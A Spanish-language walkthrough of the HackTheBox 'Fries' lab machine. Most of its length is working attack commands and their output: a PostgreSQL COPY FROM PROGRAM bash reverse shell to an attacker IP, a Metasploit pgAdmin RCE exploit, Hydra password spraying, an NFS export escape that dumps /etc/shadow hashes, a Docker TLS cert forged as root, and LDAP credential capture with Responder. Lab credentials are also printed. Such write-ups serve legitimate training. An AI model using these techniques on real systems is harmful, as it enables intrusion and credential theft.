---
hidden: true
icon: flag
---

# Fries HackTheBox (Hard)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 07:22 PST
Nmap scan report for 10.10.11.96
Host is up (0.032s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://fries.htb/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-25 15:25:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-25T15:27:31+00:00; +3m14s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
443/tcp   open  ssl/http      nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP
| Not valid before: 2025-06-01T22:06:09
|_Not valid after:  2026-06-01T22:06:09
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-25T15:27:31+00:00; +3m14s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
|_ssl-date: 2025-11-25T15:27:31+00:00; +3m14s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
|_ssl-date: 2025-11-25T15:27:31+00:00; +3m14s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49913/tcp open  msrpc         Microsoft Windows RPC
49975/tcp open  msrpc         Microsoft Windows RPC
63679/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3m13s, deviation: 1s, median: 3m13s
| smb2-time: 
|   date: 2025-11-25T15:26:49
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.48 seconds
```

Veremos varias cosas interesantes de varios puertos, pero entre ellos vemos que aloja un `SSH` y un `80` esto se debe a que tambien contiene un `Linux` de forma interna a parte del propio `host` que sea `windows`, tambien nos interesa el servidor `SMB` y `Kerberos` por parte de `Windows`.

Tambien veremos un `dominio` el cual nos tendremos que añadir a nuestro famoso archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>            fries.htb dc01.fries.htb
```

Lo guardamos...

Ya directamente nos dan unas credenciales desde `HTB`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 092605.png" alt=""><figcaption></figcaption></figure>

```
User: d.cooper@fries.htb
Pass: D4LE11maan!!
```

Vamos a realizar una prueba de credenciales a ver donde son validas, si probamos por `SSH` veremos que no seran las correctas, pero si las probamos por `SMB` tampoco.

## FFUF Subdominios

Vamos a realizar un `fuzzing` con la herramienta `FFUF` de esta forma:

```shell
ffuf -c -w <WORDLIST> -u http://fries.htb -H "Host: FUZZ.fries.htb" -fw 4
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://fries.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.fries.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

code                    [Status: 200, Size: 13591, Words: 1048, Lines: 272, Duration: 47ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Veremos que hay un `subdominio` llamado `code`, vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>            fries.htb dc01.fries.htb code.fries.htb
```

Ahora si entramos dentro veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 111215.png" alt=""><figcaption></figcaption></figure>

Vemos un `software` llamado `Gitea` que es muy interesante, si probamos las credenciales encontradas por `HTB` veremos que funciona y estaremos dentro:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 111236.png" alt=""><figcaption></figcaption></figure>

Vamos a investigar un poco los repos a ver que informacion vemos util.

Si nos vamos a los `commits` que ha hecho el usuario, veremos en el `.env` unas credenciales de `PostgreSQL`:

```
DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
SECRET_KEY=y0st528wn1idjk3b9a
```

Son bastante interesantes, ahora si seguimos investigando mas tambien encontraremos esto otro:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 112611.png" alt=""><figcaption></figcaption></figure>

Leyendo un poco el `README.md` veremos que hay un `subdominio` que contiene la `DDBB` de `PostgreSQL`, vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>            fries.htb dc01.fries.htb code.fries.htb db-mgmt05.fries.htb
```

Si entramos dentro de dicho `subdominio` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 112815 (1).png" alt=""><figcaption></figcaption></figure>

Veremos un `PgAdmin` el `login`, si probamos las credenciales encontradas no tendremos suerte, pero si reutilizamos contraseñas y ponemos la del usuario que ya tenemos de `HTB`.

```
User: d.cooper@fries.htb
Pass: D4LE11maan!!
```

Veremos que si funciona y estaremos dentro:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 112958.png" alt=""><figcaption></figcaption></figure>



Si abrimos la `DDBB` nos pedira la contraseña de `root`, ponemos la que obtuvimos desde `gitea` que seria `PsqLR00tpaSS11` y veremos que nos despliega toda la informacion de la `DDBB`.



<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 113112.png" alt=""><figcaption></figcaption></figure>

Vamos abrir una terminal de `Query` y probaremos a intentar ejecutar comandos desde el `PgAdmin`, primero veremos si funciona el `id`, listar, o este tipo de cosas.

```postgresql
SELECT pg_ls_dir('/'); -- Esto funciona, nos devuelve los directorios
SELECT pg_read_file('/etc/passwd'); -- Podemos leer archivos

-- Ejecutar comandos en sistema
CREATE TABLE IF NOT EXISTS cmd_test(result text);
COPY cmd_test FROM PROGRAM 'id';
SELECT * FROM cmd_test;
```

Info:

```
uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
```

Veremos que esta funcionando, por lo que vamos a mandarnos una `reverse shell` de esta forma, pero antes nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos esto:

```sql
CREATE TABLE IF NOT EXISTS cmd_test(result text);
COPY cmd_test FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<IP_ATTACKER>/<PORT> 0>&1"';
SELECT * FROM cmd_test;
```

Si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.49] from (UNKNOWN) [10.10.11.96] 49872
bash: cannot set terminal process group (430): Inappropriate ioctl for device
bash: no job control in this shell
postgres@858fdf51af59:~/data$ whoami
whoami
postgres
```

Ha funcionado, por lo que sanitizaremos la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Pero no veremos nada interesante, vamos a buscar vulnerabilidades asociadas con el `PgAdmin`, si buscamos un poco veremos que hay un `CVE-2025-2945`, vamos a explotarlo por `msfconsole` de esta forma:

## CVE-2025-2945 (RCE)

```shell
msfconsole -q
```

Una vez dentro del mismo, vamos a seleccionar el modulo de `exploit` que es el siguiente:

```shell
use exploit/multi/http/pgadmin_query_tool_authenticated
```

Viendo las opciones tendremos que configurarlo de esta forma:

```shell
set LHOST <IP_ATTACKER>
set LPORT <PORT>
set RHOSTS <IP_VICTIM>
set USERNAME d.cooper@fries.htb
set PASSWORD D4LE11maan!!
set DB_USER root
set DB_PASS PsqLR00tpaSS11
set DB_NAME ps_db
set RHOSTS db-mgmt05.fries.htb
set VHOST db-mgmt05.fries.htb
```

Ahora si ponemos `exploit` para ejecutar el modulo, veremos esto:

```
[*] Started reverse TCP handler on 10.10.14.49:7755 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. pgAdmin version 9.1.0 is affected
[+] Successfully authenticated to pgAdmin
[+] Successfully initialized sqleditor
[*] Exploiting the target...
[*] Sending stage (24768 bytes) to 10.10.11.96
[+] Received a 500 response from the exploit attempt, this is expected
[*] Meterpreter session 1 opened (10.10.14.49:7755 -> 10.10.11.96:49808) at 2025-11-25 10:49:55 -0800

meterpreter > getuid
Server username: pgadmin
```

Vemos que ha funcionado y obtuvimos acceso por otro usuario y en otro conetendor, por lo que vamos a investigar un poco que podemos hacer aqui.

## Escalate user svc

Si listamos las variables de entorno encontramos lo siguiente:

```shell
env
```

Info:

```
HOSTNAME=cb46692a4590
SHLVL=1
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
CONFIG_DISTRO_FILE_PATH=/pgadmin4/config_distro.py
HOME=/home/pgadmin
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
SERVER_SOFTWARE=gunicorn/22.0.0
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OAUTHLIB_INSECURE_TRANSPORT=1
CORRUPTED_DB_BACKUP_FILE=
PWD=/pgadmin4
PGAPPNAME=pgAdmin 4 - CONN:3139039
PYTHONPATH=/pgadmin4
```

Vemos que hay una contraseña para el usuario `admin@fries.htb`, que si la probamos en `PgAdmin` si funcionara y despues metemos la contraseña de `root` y nos listara las `DDBBs` que hay, pero sin ver nada interesante, nos guardaremos esa contraseña por si nos sirviera en algun futuro.

Vamos a probar a recopilar usuarios creando una lista de usuarios y tirando primero fuerza bruta por `SSH`, si nos vamos a esta pagina la cual obtuve su subdominio tirando un `fuzzing` que se llama `pwm` hay que entrar por `HTTPS`.

```
URL = https://pwm.fries.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 141019.png" alt=""><figcaption></figcaption></figure>

Veremos un `login` si probamos a poner cualquier credencial, como `admin:admin` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 141058.png" alt=""><figcaption></figcaption></figure>

Vemos que nos salta un error y muestra informacion importante entre ella un usuario, vamos con toda esta info hacer el `users.txt`.

> users.txt

```
admin
d.cooper
cooper
dale
administrator
root
postgres
pgadmin
fries
svc_infra
svc
infra
```

Ahora vamos a lanzarle un `hydra`.

```shell
hydra -L users.txt -p 'Friesf00Ds2025!!' ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-25 11:41:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 13 tasks per 1 server, overall 13 tasks, 13 login tries (l:13/p:1), ~1 try per task
[DATA] attacking ssh://10.10.11.96:22/
[22][ssh] host: 10.10.11.96   login: svc   password: Friesf00Ds2025!!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-25 11:41:25
```

### SSH (svc)

Vemos que ha funcionado, por lo que accederemos por `SSH` con las credenciales.

```shell
ssh svc@<IP>
```

Metemos como contraseña `Friesf00Ds2025!!`...

```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-87-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Nov 25 08:13:05 PM UTC 2025

  System load:  0.0                Processes:             211
  Usage of /:   67.7% of 13.67GB   Users logged in:       1
  Memory usage: 74%                IPv4 address for eth0: 192.168.100.2
  Swap usage:   0%

  => There are 4 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Nov 25 20:13:06 2025 from 10.10.14.3
svc@web:~$ whoami
svc
```

Con esto veremos que estaremos dentro, ahora vamos a realizar un poco de enumeracion a ver que vemos.

## Escalate user svc\_infra

### Vulnerabilidad NFS

Si investigamos mucho veremos que hay una vulnerabilidad a nivel de `NFS`, se puede descubrir esto si listamos lo siguiente:

```shell
showmount -e localhost
```

Info:

```
Export list for localhost:
/srv/web.fries.htb *
```

Vemos que podemos montar lo que queramos dentro de dicha carpeta y casualmente hay una carpeta con todos los permisos:

```shell
ls -la /srv/web.fries.htb
```

Info:

```
total 20
drw-r-xr-x 5  655 root           4096 May 28 17:17 .
drwxr-xr-x 3 root root           4096 May 27  2025 ..
drwxrwx--- 2 root infra managers 4096 May 26  2025 certs
drwxrwxrwx 2 root root           4096 Nov 26 16:14 shared
drwxr----- 5 svc  svc            4096 Jun  7 13:30 webroot
```

Pero antes de hacer nada, habiendo identificado esto, vamos a irnos a nuestro `kali` y trabajaremos desde ahi utilizando una herramienta que crea un `tunel` o mejor dicho es un `proxy/VPN` hacia el servidor victima para poder trabajar de forma externa como si estuvieramos en la red local interna.

```shell
apt install sshuttle
```

Una vez que lo hayamos instalado, vamos a ejecutarlo de esta forma:

```shell
sshuttle -r svc@<IP> -N
```

Info:

```
svc@10.10.11.96's password: 
c : Connected to server.
```

Con esto sabremos que ya esta `tunelizado` ahora desde otra terminal en nuestro `kali` vamos a descargarnos una herramienta que encontre en internet que nos ayudara a toda esta explotacion de esta forma:

URL = [GitHub nfs-security-tooling](https://github.com/hvs-consulting/nfs-security-tooling)

Vamos a ejecutar estos comandos para instalar la herramienta:

```shell
sudo apt update
sudo apt install pkg-config libfuse3-dev python3-dev
pipx install git+https://github.com/hvs-consulting/nfs-security-tooling.git
```

Info:

```
installed package nfs_security_tooling 0.1, installed using Python 3.13.7
  These apps are now globally available
    - fuse_nfs
    - nfs_analyze
⚠️  Note: '/root/.local/bin' is not on your PATH environment variable. These apps will not be globally accessible until your PATH is updated. Run `pipx
    ensurepath` to automatically add it, or manually modify your PATH in your shell's config file (e.g. ~/.bashrc).
done! ✨ 🌟 ✨
```

Una vez que nos lo haya instalado todo de forma correcta, vamos a ejecutarla de esta forma:

```shell
/root/.local/bin/nfs_analyze 192.168.100.2 --check-no-root-squash
```

Info:

```
Checking host 192.168.100.2
Supported protocol versions reported by portmap:
Protocol          Versions  
portmap           2, 3, 4   
mountd            1, 2, 3   
status monitor 2  1         
nfs               3, 4      
nfs acl           3         
nfs lock manager  1, 3, 4   

Available Exports reported by mountd:
Directory           Allowed clients  Auth methods  Export file handle                                        
/srv/web.fries.htb  *(wildcard)      sys           0100070001000a00000000008a01da16c18a400cbc9b37e3567d3fba  

Connected clients reported by mountd:
Client               Export              
192.168.100.2(down)  /srv/web.fries.htb  

Supported NFS versions reported by nfsd:
Version  Supported  
3        Yes        
4.0      Yes        
4.1      Yes        
4.2      Yes        

NFSv3 Windows File Handle Signing: OK, server probably not Windows, File Handle not 32 bytes long

Trying to escape exports
Export: /srv/web.fries.htb: file system type ext/xfs, parent: None, 655363
Escape successful, root directory listing:
lib64 mnt sys etc proc lib snap lost+found media tmp dev var .bash_history .. swap.img srv home libx32 bin root usr . sbin lib32 opt boot run
Root file handle: 0100070201000a00000000008a01da16c18a400cbc9b37e3567d3fba02000000000000000200000000000000

GID of shadow group: 42
Content of /etc/shadow:
root:$y$j9T$yqbmFwMbHh7qoaRaY3jx..$FMFv9upB20J4yPWwAJxndkOA4zzrn5/Udv4BF9LbLq/:20239:0:99999:7:::
daemon:*:19579:0:99999:7:::                                                                                                                                  
bin:*:19579:0:99999:7:::                                                                                                                                     
sys:*:19579:0:99999:7:::                                                                                                                                     
sync:*:19579:0:99999:7:::                                                                                                                                    
games:*:19579:0:99999:7:::                                                                                                                                   
man:*:19579:0:99999:7:::                                                                                                                                     
lp:*:19579:0:99999:7:::                                                                                                                                      
mail:*:19579:0:99999:7:::                                                                                                                                    
news:*:19579:0:99999:7:::                                                                                                                                    
uucp:*:19579:0:99999:7:::                                                                                                                                    
proxy:*:19579:0:99999:7:::                                                                                                                                   
www-data:*:19579:0:99999:7:::                                                                                                                                
backup:*:19579:0:99999:7:::                                                                                                                                  
list:*:19579:0:99999:7:::                                                                                                                                    
irc:*:19579:0:99999:7:::                                                                                                                                     
gnats:*:19579:0:99999:7:::                                                                                                                                   
nobody:*:19579:0:99999:7:::                                                                                                                                  
_apt:*:19579:0:99999:7:::                                                                                                                                    
systemd-network:*:19579:0:99999:7:::                                                                                                                         
systemd-resolve:*:19579:0:99999:7:::                                                                                                                         
messagebus:*:19579:0:99999:7:::                                                                                                                              
systemd-timesync:*:19579:0:99999:7:::                                                                                                                        
pollinate:*:19579:0:99999:7:::                                                                                                                               
sshd:*:19579:0:99999:7:::                                                                                                                                    
syslog:*:19579:0:99999:7:::                                                                                                                                  
uuidd:*:19579:0:99999:7:::                                                                                                                                   
tcpdump:*:19579:0:99999:7:::                                                                                                                                 
tss:*:19579:0:99999:7:::                                                                                                                                     
landscape:*:19579:0:99999:7:::                                                                                                                               
fwupd-refresh:*:19579:0:99999:7:::                                                                                                                           
usbmux:*:19589:0:99999:7:::                                                                                                                                  
svc:$y$j9T$Y7j3MSqEJTcNTqSSVJRS2.$h0AFlCXKB9V0PZ.BIyZKSGR6WFJWlxIRiqK.JLOB4PD:20238:0:99999:7:::                                                             
lxd:!:19589::::::                                                                                                                                            
_rpc:*:20234:0:99999:7:::                                                                                                                                    
statd:*:20234:0:99999:7:::                                                                                                                                   
dnsmasq:*:20234:0:99999:7:::                                                                                                                                 
barman:*:20236:0:99999:7:::                                                                                                                                  
sssd:*:20238:0:99999:7:::                                                                                                                                    
                                                                                                                                                             
Checking no_root_squash
Export              no_root_squash  
/srv/web.fries.htb  DISABLED        

NFSv4 overview and auth methods (incomplete)
srv: pseudo
    web.fries.htb: sys
        shared: sys
        certs: sys
        webroot: sys

NFSv4 guessed exports (Linux only, may differ from /etc/exports):
Directory           Auth methods  Export file handle                                        
/srv/web.fries.htb  sys           0100070001000a00000000008a01da16c18a400cbc9b37e3567d3fba  


Trying to guess server OS
OS       Property                                      Fulfilled  
Linux    File Handles start with 0x0100                Yes        
Windows  NFSv3 File handles are 32 bytes long          No         
Windows  Only NFS versions 3 and 4.1 supported         No         
FreeBSD  Mountd reports subnets without mask           Unknown    
NetApp   netapp partner protocol supported             No         
HP-UX    Only one request per TCP connection possible  No         

Final OS guess: Linux
```

Con este `check` veremos que nos saca mucha informacion de que es vulnerable a parte del `shadow`, por lo que vamos a pasar a la `explotacion`.

```shell
mkdir /tmp/nfs_mount
/root/.local/bin/fuse_nfs --export /srv/web.fries.htb --fake-uid --allow-write /tmp/nfs_mount 192.168.100.2
```

Ahora vamos a ver que se paso bien.

```shell
ls -la /tmp/nfs_mount
```

Info:

```
total 0
drwxrwxrwx 2 root 59605603 4096 May 26  2025 certs
drwxrwxrwx 2 root root     4096 Nov 26 08:14 shared
drwxr--rwx 5 kali kali     4096 Jun  7 06:30 webroot
```

Vemos que ha funcionado, teniendo el `CA` podremos crear un certificado autofirmado como el usuario `root` para poder acceder como dicho usuario por `SSH`.

Vamos a entrar dentro de `certs` y nos `tunelizaremos` el puerto `2376`, ya que el `certificado` esta utilizando la `IP` local y requiere de que se haga asi para que no de errores.

```shell
ssh svc@<IP> -L 2376:127.0.0.1:2376
```

Metemos la contraseña del usuario y estaremos dentro del `SSH`, ahora teniendo el puerto `tunelizado` vamos a ejecutar un comando de `docker` de forma interna de la maquina pero desde nuestro `kali`.

```shell
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=cert.pem \
  --tlskey=key.pem \
  -H=tcp://127.0.0.1:2376 ps
```

Info:

```
Error response from daemon: authorization denied by plugin authz-broker: no policy applied (user: 'fries' action: 'container_list')
```

Vemos que nos esta dando un error, pero es un error bueno, solamente tendremos que generar nuestro certificado autofirmado como `root`, ya que el error pone que se esta utilizando el del usuario `fries`.

```shell
openssl genrsa -out root-key.pem 4096
openssl req -new -key root-key.pem -out root.csr -subj "/CN=root"
openssl x509 -req -in root.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out root-cert.pem -days 365
```

Info:

```
Certificate request self-signature ok
subject=CN=root
```

Ahora si listamos de nuevo los procesos de los `dockers`...

```shell
docker --tlsverify \                                                               
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  -H=tcp://127.0.0.1:2376 ps
```

Info:

```
CONTAINER ID   IMAGE                   COMMAND                  CREATED        STATUS       PORTS                                                                        NAMES
f427ecaa3bdd   pwm/pwm-webapp:latest   "/app/startup.sh"        5 months ago   Up 7 hours   0.0.0.0:8443->8443/tcp, :::8443->8443/tcp                                    pwm
cb46692a4590   dpage/pgadmin4:9.1.0    "/entrypoint.sh"         6 months ago   Up 7 hours   443/tcp, 127.0.0.1:5050->80/tcp                                              pgadmin4
bfe752a26695   fries-web               "/usr/local/bin/pyth…"   6 months ago   Up 7 hours   127.0.0.1:5000->5000/tcp                                                     web
858fdf51af59   postgres:16             "docker-entrypoint.s…"   6 months ago   Up 7 hours   5432/tcp                                                                     postgres
b916aad508e2   gitea/gitea:1.22.6      "/usr/bin/entrypoint…"   6 months ago   Up 7 hours   127.0.0.1:3000->3000/tcp, 172.18.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
```

Veremos que esta vez esta funcionando, por lo que vamos a meternos en el `contenedor` que mas nos llama la atencion, que es el del `ID` `f42` por que recordemos que es el que esta utilizando `LDAP` y tenemos acceso al mismo para poder modificar lo que queramos.

```shell
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  -H=tcp://127.0.0.1:2376 exec -it f42 /bin/bash
```

Dentro del contenedor si investigamos un poco veremos este archivo:

```shell
cat /config/PwmConfiguration.xml | grep "ldap*"
```

Info:

```
............................<RESTO DE CODIGO>.....................................
        <setting key="ldap.serverUrls" modifyTime="2025-06-01T19:53:04Z" profile="default" syntax="STRING_ARRAY" syntaxVersion="0">
            <value>ldaps://dc01.fries.htb:636</value>
............................<RESTO DE CODIGO>.....................................
```

Veremos esta seccion interesante en la que se esta intentando conectar pero que da error, lo que se nos ocurre es modificar el archivo y hacer que apunte a nuestra `IP` para capturar las credenciales de dicho usuario de `servicio` estando a la escucha con `responder`.

```shell
sed -i 's|ldaps://dc01.fries.htb:636|ldap://<IP_ATTACKER>:389|' PwmConfiguration.xml
```

Una vez que hayamos hecho eso, vamos a conectarnos a la pagina donde esta alojada:

```
URL = https://pwm.fries.htb
```

Ahora nos pondremos a la escucha:

```shell
responder -I tun0 -wdv
```

Si metemos una credenciales cualquiera en dicho `login` y volvemos a donde tenemos la escucha:

```
[+] Listening for events...                                                                                                                                  

[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.10.11.96
[LDAP] Cleartext Username : CN=svc_infra,CN=Users,DC=fries,DC=htb
[LDAP] Cleartext Password : m6tneOMAh5p0wQ0d
[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.10.11.96
[LDAP] Cleartext Username : CN=svc_infra,CN=Users,DC=fries,DC=htb
[LDAP] Cleartext Password : m6tneOMAh5p0wQ0d
[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.10.11.96
[LDAP] Cleartext Username : CN=svc_infra,CN=Users,DC=fries,DC=htb
[LDAP] Cleartext Password : m6tneOMAh5p0wQ0d
[+] Exiting...
```

## Escalate user GMSA\_CA\_PROD$

Veremos que ha funcionado, por lo que vamos a probar las credenciales por `netexec`.

```shell
netexec ldap <IP> -u svc_infra -p 'm6tneOMAh5p0wQ0d'
```

Info:

```
LDAP        10.10.11.96     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb)
LDAP        10.10.11.96     389    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d
```

Veremos que funcionan y son validas, por lo que vamos a descargarnos un `ZIP` para examinarlo en `BloodHound`.

```shell
bloodhound-ce-python -d 'fries.htb' -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' -ns '<IP>' -c All --zip
```

Info:

```
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: fries.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.fries.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.fries.htb
INFO: Found 19 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: web
INFO: Querying computer: DC01.fries.htb
WARNING: Could not resolve: web: The resolution lifetime expired after 3.104 seconds: Server Do53:10.10.11.96@53 answered The DNS operation timed out.
INFO: Done in 00M 17S
INFO: Compressing output into 20251126112728_bloodhound.zip
```

### BloodHound

Ahora vamos a instalar `BloodHound` de forma rapida en un `docker`:

URL = [Download BloodHound en Docker](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

```shell
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install
```

Info:

```
..............................<RESTO DE INFO>......................................
Container bloodhound-graph-db-1  Creating
 Container bloodhound-app-db-1  Creating
 Container bloodhound-graph-db-1  Created
 Container bloodhound-app-db-1  Created
 Container bloodhound-bloodhound-1  Creating
 Container bloodhound-bloodhound-1  Created
 Container bloodhound-app-db-1  Starting
 Container bloodhound-graph-db-1  Starting
 Container bloodhound-app-db-1  Started
 Container bloodhound-graph-db-1  Started
 Container bloodhound-graph-db-1  Waiting
 Container bloodhound-app-db-1  Waiting
 Container bloodhound-graph-db-1  Healthy
 Container bloodhound-app-db-1  Healthy
 Container bloodhound-bloodhound-1  Starting
 Container bloodhound-bloodhound-1  Started
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

Ahora que esta importado en nuestro `docker` y levantado podremos acceder a el desde la siguiente `URL`.

```
URL = http://127.0.0.1:8080/ui/login
```

